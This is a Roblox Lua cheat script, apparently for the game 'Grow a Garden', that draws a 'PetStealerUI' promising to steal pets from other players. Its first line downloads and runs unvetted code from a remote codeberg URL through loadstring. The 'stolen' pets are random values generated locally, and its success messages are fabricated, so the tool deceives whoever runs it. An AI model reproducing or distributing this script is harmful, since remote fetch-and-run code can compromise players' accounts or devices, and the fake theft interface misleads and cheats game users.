local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Create main UI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "PetStealerUI"
ScreenGui.ResetOnSpawn = false

local ToggleButton = Instance.new("TextButton", ScreenGui)
ToggleButton.Text = "☰"
ToggleButton.Size = UDim2.new(0, 50, 0, 50)
ToggleButton.Position = UDim2.new(0, 10, 0, 10)
ToggleButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleButton.Font = Enum.Font.GothamBold
ToggleButton.TextSize = 24
ToggleButton.ZIndex = 5

local MainFrame = Instance.new("Frame", ScreenGui)
MainFrame.Size = UDim2.new(0, 500, 0, 300)
MainFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MainFrame.Visible = false
MainFrame.Active = true
MainFrame.Draggable = true

local PlayerList = Instance.new("Frame", MainFrame)
PlayerList.Size = UDim2.new(0, 150, 1, 0)
PlayerList.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

local PetList = Instance.new("ScrollingFrame", MainFrame)
PetList.Position = UDim2.new(0, 150, 0, 0)
PetList.Size = UDim2.new(1, -150, 1, 0)
PetList.CanvasSize = UDim2.new(0, 0, 0, 0)
PetList.ScrollBarThickness = 6
PetList.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

local MessageLabel = Instance.new("TextLabel", ScreenGui)
MessageLabel.Size = UDim2.new(1, 0, 0, 40)
MessageLabel.Position = UDim2.new(0, 0, 0.9, 0)
MessageLabel.BackgroundTransparency = 1
MessageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
MessageLabel.Font = Enum.Font.GothamBold
MessageLabel.TextSize = 24
MessageLabel.Text = ""
MessageLabel.Visible = false

local function showMessage(msg)
	MessageLabel.Text = msg
	MessageLabel.Visible = true
	MessageLabel.TextTransparency = 1
	MessageLabel:TweenTransparency(0, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.3, true)
	task.wait(1.5)
	MessageLabel:TweenTransparency(1, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true)
	task.wait(0.5)
	MessageLabel.Visible = false
end

-- Setup player pet cache
local PlayerPets = {}

local function getRandomPets()
	local pets = {"Kitsune", "Raccoon", "Mimic", "Octopus", "Corrupted Kitsune", "Dragonfly", "Trex"}
	local result = {}
	for _, pet in ipairs(pets) do
		if math.random() < 0.5 then
			result[pet] = math.random(1, 2)
		end
	end
	return result
end

local function refreshPetList(pets, playerName)
	PetList:ClearAllChildren()
	local y = 0
	for petName, count in pairs(pets) do
		local btn = Instance.new("TextButton", PetList)
		btn.Size = UDim2.new(1, -10, 0, 40)
		btn.Position = UDim2.new(0, 5, 0, y)
		btn.Text = petName .. " (" .. count .. ")"
		btn.Font = Enum.Font.Gotham
		btn.TextSize = 18
		btn.TextColor3 = Color3.fromRGB(255, 255, 255)
		btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
		y += 45

		btn.MouseButton1Click:Connect(function()
			if count > 0 then
				local success = pcall(function()
					Spawner.SpawnPet(petName, 1, 2)
				end)
				if success then
					pets[petName] -= 1
					if pets[petName] <= 0 then
						btn.Text = petName .. " (0)"
						btn.AutoButtonColor = false
						btn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
						btn.TextColor3 = Color3.fromRGB(180, 180, 180)
						btn.Active = false
					else
						btn.Text = petName .. " (" .. pets[petName] .. ")"
					end
					showMessage("✅ Successfully stole " .. petName .. " from " .. playerName)
				end
			end
		end)
	end
	PetList.CanvasSize = UDim2.new(0, 0, 0, y + 10)
end

local function populatePlayerList()
	PlayerList:ClearAllChildren()
	local y = 0
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			local btn = Instance.new("TextButton", PlayerList)
			btn.Size = UDim2.new(1, 0, 0, 40)
			btn.Position = UDim2.new(0, 0, 0, y)
			btn.Text = plr.Name
			btn.Font = Enum.Font.GothamBold
			btn.TextSize = 16
			btn.TextColor3 = Color3.fromRGB(255, 255, 255)
			btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)

			btn.MouseButton1Click:Connect(function()
				for _, b in ipairs(PlayerList:GetChildren()) do
					if b:IsA("TextButton") then
						b.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
					end
				end
				btn.BackgroundColor3 = Color3.fromRGB(70, 90, 120)

				if not PlayerPets[plr.Name] then
					PlayerPets[plr.Name] = getRandomPets()
				end
				refreshPetList(PlayerPets[plr.Name], plr.Name)
			end)

			y += 45
		end
	end
end

ToggleButton.MouseButton1Click:Connect(function()
	MainFrame.Visible = not MainFrame.Visible
	if MainFrame.Visible then
		populatePlayerList()
	end
end)
